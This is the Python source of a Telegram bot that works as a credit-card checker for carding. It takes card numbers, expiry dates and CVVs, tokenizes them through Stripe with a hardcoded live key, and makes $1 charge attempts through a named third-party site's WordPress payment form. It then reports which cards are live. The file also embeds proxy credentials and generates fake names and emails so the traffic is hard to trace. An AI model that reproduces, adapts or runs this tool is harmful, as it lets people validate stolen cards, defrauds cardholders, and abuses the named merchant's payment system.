import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from bs4 import BeautifulSoup as bs

# ─── Config ─────────────────────────────────────────────────────────────────
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# ─── Bot & Dispatcher ──────────────────────────────────────────────────────
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# ─── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)

# ─── Python 3.14+ safe event loop ───────────────────────────────────────────
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# ─── Bot info ────────────────────────────────────────────────────────────────
bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# ─── Proxies (update these with your rotating proxy) ─────────────────────────
proxies = {
    'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
    'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
}

session = requests.Session()

# ─── Random data for carding ────────────────────────────────────────────────
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for _ in range(6))
Last = ''.join(random.choice(letters) for _ in range(6))
PWD = ''.join(random.choice(letters) for _ in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

# ─── Helpers ─────────────────────────────────────────────────────────────────

async def is_owner(user_id):
    return user_id == OWNER


async def is_card_valid(ccn):
    """Luhn algorithm check."""
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(ccn)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(digits_of(d * 2))
    return total % 10 == 0


# ─── /start command ─────────────────────────────────────────────────────────

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer_chat_action('typing')
    await message.reply(
        f"✅ **I'm alive, {message.from_user.first_name}!**\n\n"
        f"**Commands:**\n"
        f"`{PREFIX}chk <cc>|mm|yy|cvv` — Check a card\n"
        f"`{PREFIX}bin <bin>` — BIN lookup\n"
        f"`{PREFIX}id` — Your user info\n"
        f"\nBot: @{BOT_USERNAME}"
    )


# ─── /id command ────────────────────────────────────────────────────────────

@dp.message_handler(commands=['id'], commands_prefix=PREFIX)
async def uid(message: types.Message):
    await message.answer_chat_action('typing')
    user_id = message.from_user.id
    username = message.from_user.username or 'None'
    first = message.from_user.first_name
    is_bot = message.from_user.is_bot
    await message.reply(
        f'''╒═══════════
**USER ID:** `{user_id}`
**USERNAME:** @{username}
**FIRSTNAME:** {first}
**BOT:** {is_bot}
**BOT-OWNER:** {await is_owner(user_id)}
╘═══════════'''
    )


# ─── /bin command ───────────────────────────────────────────────────────────

@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len(f'{PREFIX}bin '):]
    if len(BIN) < 6:
        return await message.reply('Send BIN not ass')
    r = requests.get(f'https://bins.ws/search?bins={BIN[:6]}').text
    soup = bs(r, features='html.parser')
    k = soup.find("div", {"class": "page"})
    INFO = f'''
{k.text[62:]}
SENDER: [{FIRST}](tg://user?id={ID})
BOT⇢ @{BOT_USERNAME}
OWNER⇢ [LINK](tg://user?id={OWNER})
'''
    await message.reply(INFO)


# ─── /chk command ───────────────────────────────────────────────────────────

@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    s = requests.Session()

    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        return await message.reply(
            f'**Too many requests!**\nBlocked For {ANTISPAM} seconds'
        )

    # Parse card data
    if message.reply_to_message:
        cc = message.reply_to_message.text
    else:
        cc = message.text[len(f'{PREFIX}chk '):]

    if len(cc) == 0:
        return await message.reply("**No Card to chk**")

    x = re.findall(r'\d+', cc)
    if len(x) < 4:
        return await message.reply('**Failed to parse Card**\n**Reason: Invalid Format!**')

    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]

    if mm.startswith('2'):
        mm, yy = yy, mm
    if len(mm) >= 3:
        mm, yy, cvv = yy, cvv, mm

    if len(ccn) < 15 or len(ccn) > 16:
        return await message.reply('**Failed to parse Card**\n**Reason: Invalid Format!**')

    BIN = ccn[:6]
    if BIN in BLACKLISTED:
        return await message.reply('**BLACKLISTED BIN**')

    if not await is_card_valid(ccn):
        return await message.reply('**Invalid luhn algorithm**')

    # ── Stripe tokenization ──
    headers = {
        "user-agent": UA,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
    }

    m = s.post('https://m.stripe.com/6', headers=headers)
    r = m.json()
    Guid = r['guid']
    Muid = r['muid']
    Sid = r['sid']

    postdata = {
        "guid": Guid,
        "muid": Muid,
        "sid": Sid,
        "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
        "card[name]": Name,
        "card[number]": ccn,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvv
    }

    HEADER = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": UA,
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-US,en;q=0.9"
    }

    pr = s.post('https://api.stripe.com/v1/tokens', data=postdata, headers=HEADER)
    if pr.status_code != 200:
        return await message.reply("**Site is Dead**")

    Id = pr.json()['id']

    # ── Charge attempt via WP plugin ──
    nonce = s.get("https://www.hwstjohn.com/pay-now/")
    form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)

    load = {
        "action": "wp_full_stripe_payment_charge",
        "formName": "default",
        "formNonce": form,
        "fullstripe_name": Name,
        "fullstripe_email": Email,
        "fullstripe_custom_amount": "1",
        "fullstripe_amount_index": 0,
        "stripeToken": Id
    }

    header = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9"
    }

    rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php', data=load, headers=header)
    msg = rx.json()['msg']
    toc = time.perf_counter()

    # ── Response ──
    status = "DEAD"
    if 'true' in rx.text:
        status = "#CHARGED 1$"
    elif 'security code' in rx.text:
        status = "#CCN"
    elif 'false' in rx.text:
        status = "#Declined"

    await message.reply(f'''
{'✅' if 'true' in rx.text or 'security code' in rx.text else '❌'}**CC**➟ `{ccn}|{mm}|{yy}|{cvv}`
**STATUS**➟ {status}
**MSG**➟ {msg if 'true' in rx.text or 'security code' in rx.text else rx.text}
**TOOK:** `{toc - tic:0.2f}`(s)
**CHKBY**➟ [{FIRST}](tg://user?id={ID})
**OWNER**: {await is_owner(ID)}
**BOT**: @{BOT_USERNAME}''')


# ─── Entry point ────────────────────────────────────────────────────────────

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
